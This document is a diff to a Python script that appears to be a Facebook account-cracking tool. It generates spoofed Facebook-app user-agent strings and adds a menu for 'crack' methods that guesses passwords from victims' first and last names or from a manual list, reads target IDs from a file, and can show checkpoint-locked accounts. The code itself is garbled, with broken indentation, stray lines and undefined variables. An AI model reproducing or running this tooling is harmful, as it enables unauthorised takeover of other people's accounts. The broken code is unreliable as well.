@@ -128,22 +128,24 @@ for agent in range(10000):
         fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
         ugen.append(fullagnt)
 
-for xd in range(10000):
-	a='Mozilla/5.0 (Symbian/3; Series60/','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
-	b=random.randrange(1, 9)
-	c=random.randrange(1, 9)
-	d='Nokia','Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; Google Pixel 4 Build/QD1A.190821.014.C2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36'
-	e=random.randrange(100, 9999)
-	#f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
-	g=random.randrange(1, 9)
-	h=random.randrange(1, 4)
-	i=random.randrange(1, 4)
-	j=random.randrange(1, 4)
-	k='Mobile Safari/535.1','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
+,  
+def ua1():
+    alex1 = str(random.randint(100,400))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
+    alex9 = str(random.randint(200,400))+".0.0."+str(random.randint(7,37))+"."+str(random.randint(101,151))
+    alex2 = random.randint(410000000,499999999)
+    cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853','CPH2127', 'CPH2131','PDVM00','CPH2095','CPH2119','PEAT00', 'PEAM00','CPH2137','CPH2125','CPH2065','CPH2121', 'CPH2123','CPH2099','CPH2139', 'CPH2135','CPH2185','SPH2209','CPH2161','PERM00','CPH2109','CPH2113','PDYM20', 'PDYT20','PDNM00', 'PDNT00', 'CPH2089'])  
+    ua = 'Dalvik/2.1.0 (Linux; U; Android 14.5.0; CPH2207 Build/OPR6.101106.028) [FBAN/FB4A;FBAV/392.0.0.32.108;FBPN/com.facebook.katana;FBLC/en_US;FBBV/318413147;FBCR/MetroPCS;FBMF/OPPO;FBBD/oppo;FBDV/CPH2207;FBSV/14.5.0;FBCA/x86_64:x86:arm64-v8a;FBDM/{density=1.8,width=1345,height=1023};FB_FW/1;FBRV/318805181;]' + \
+'Dalvik/2.1.0 (Linux; U; Android 12.6.2; SM-J105F Build/PD2A.180728.025) [FBAN/FB4A;FBAV/391.1.0.37.104;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/318217130;FBCR/PremiumSIM;FBMF/Samsung;FBBD/samsung;FBDV/SM-J105F;FBSV/12.6.2;FBCA/arm64-v8a:;FBDM/{density=3.0,width=536,height=1820};FB_FW/1;]' + \
+'Dalvik/2.1.0 (Linux; U; Android 5.5.2; V17 Pro Build/PPR1.200306.029) [FBAN/FB4A;FBAV/31.0.0.0.0;FBPN/com.facebook.katana;FBLC/en_US;FBBV/7930627;FBCR/Verizon;FBMF/Vivo;FBBD/vivo;FBDV/V17 Pro;FBSV/5.5.2;FBCA/x86_64:x86:armeabi-v7a;FBDM/{density=1.75,width=774,height=2521};FB_FW/1;] FBBK/1]' + \
+'Dalvik/2.1.0 (Linux; U; Android 9.7.0; Y69 Build/PPR2.180202.010) [FBAN/FB4A;FBAV/139.0.0.26.93;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/70506848;FBCR/Smartmobil;FBMF/Vivo;FBBD/vivo;FBDV/Y69;FBSV/9.7.0;FBCA/x86_64:armeabi-v7a;FBDM/{density=1.875,width=783,height=733};FB_FW/1;FBRV/70645913;]' + \
+'Dalvik/2.1.0 (Linux; U; Android 15.6.1; SM-J200F Build/QD4A.130310.058) [FBAN/FB4A;FBAV/465.0.0.0.6;FBPN/com.facebook.katana;FBLC/en_AU;FBBV/452000754;FBCR/Telstra;FBMF/Samsung;FBBD/samsung;FBDV/SM-J200F;FBSV/15.6.1;FBCA/x86_64:x86:armeabi-v7a;FBDM/{density=1.278,width=684,height=1221};]' + \
+'Dalvik/2.1.0 (Linux; U; Android 11.6.2; SM-J200F Build/SD2A.201009.016) [FBAN/FB4A;FBAV/156.0.0.36.100;FBPN/com.facebook.katana;FBLC/en_CA;FBBV/88997456;FBCR/Fido Solutions;FBMF/Samsung;FBBD/samsung;FBDV/SM-J200F;FBSV/11.6.2;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=641,height=1134};]' + \
+'Dalvik/2.1.0 (Linux; U; Android 7.8.4; GRA-L09 Build/SQ3A.070113.003) [FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097173;FBDM/{density=2.0,width=879,height=1032};FBLC/en_CA;FBRV/20156271;FB_FW/2;FBCR/Fido Solutions;FBMF/Huawei;FBBD/huawei;FBPN/com.facebook.katana;FBDV/GRA-L09;FBSV/7.8.4;FBOP/19;FBCA/arm64-v8a:;]' + \
+'Dalvik/2.1.0 (Linux; U; Android 12.8.0; SM-G530F Build/RQ3A.110801.033) [FBAN/FB4A;FBAV/349.0.0.39.470;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/309853966;FBCR/Penny Mobil;FBMF/Samsung;FBBD/samsung;FBDV/SM-G530F;FBSV/12.8.0;FBCA/x86_64:arm64-v8a:armeabi-v7a;FBDM/{density=1.25,width=876,height=2323};FB_FW/1;FBRV/310203023;] FBBK/1]'
 	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
 	ugen.append(uaku)
-
-	aa='Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
+ return ua
+#Dalvik/2.1.0 (Linux; U; Android 14; SM-S926B Build/UP1A.240106.001) [FBAN/FB4A;FBAV/474.9.19.29.929;FBBV/4740919822;FBDM/{density=3.72,width=1440,height=3125};FBLC/ar_SA;FBRV/4740919822;FBCR/Mobily;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S926B;FBSV/14;FBOP/1;FBCA/arm64-v8a;]
 	b=random.choice(['6','7','8','9','10','11','12'])
 	c=' en-us; GT-'
 	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -426,17 +428,46 @@ def method_crack():
         main_crack().crack(id)
     elif option =='0':
         Siam()
-    else:
-      print('\n Select Wrong Option ...')
-      time.sleep(2)
-      method_crack()
-
-class main_crack():
-    def __init__(self):
-        self.id=[]
-    def crack(self,id):
-        global methods
-        clear()
+   clear()
+                print(' \033[1;32m[\033[1;31m–\033[1;32m] TRY METHOD 1 & 4 FOR BEST RESULTS ')
+                dino()
+                print(' \033[1;32m[\033[1;31m1\033[1;32m] METHOD / \033[1;31m MIX IDS ')
+                print(' \033[1;32m[\033[1;31m2\033[1;32m] METHOD / \033[1;31m MIX IDS ')
+                print(' \033[1;32m[\033[1;31m3\033[1;32m] METHOD / \033[1;31m MIX IDS ')
+                print(' \033[1;32m[\033[1;31m4\033[1;32m] METHOD / \033[1;31m MIX IDS ')
+                dino()
+                mthd=input(' \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ')
+                dino()
+                plist = []
+                ps_limit = 0 
+                clear()
+                print(" \033[1;32m[\033[1;31m1\033[1;32m] AUTO PASSWORD ")                                
+                print(" \033[1;32m[\033[1;31m2\033[1;32m] MANUAL PASSWORD ")
+                dino()
+                psx=input(' \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ')
+                if psx in ['1','01']:
+                             plist.append('first first')
+                             plist.append('first last')
+                             plist.append('last first')
+                             plist.append('last last') 
+                else: 	
+                 try:
+                    dino()
+                    ps_limit = int(input(' How many passwords do you want to add ? '))                    
+                 except:
+                       ps_limit =1
+                clear() 
+                print(' \033[1;32m[\033[1;31m–\033[1;32m] EXAMPLE : first last,firtslast,first123')
+                dino()
+                for i in range(ps_limit): 
+                    plist.append(input(f' \033[1;32m[\033[1;31m–\033[1;32m] PASSWORD {i+1}:\033[1;31m '))
+                clear()
+                print(' \033[1;32m[\033[1;31m–\033[1;32m] DO YOU WENT SHOW CP ACCOUNT ? [Y/N] : ')
+                dino()
+                cx=input(' \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ')
+                if cx in ['y','Y','yes','Yes','1']:
+                    pcp.append('y')
+#else: 	
         print("\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m]\033[38;5;46m Put File  Example ● /sdcard/file.txt ")
         self.file = input('\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m]\x1b[1;92m File Path ● ')
         try:
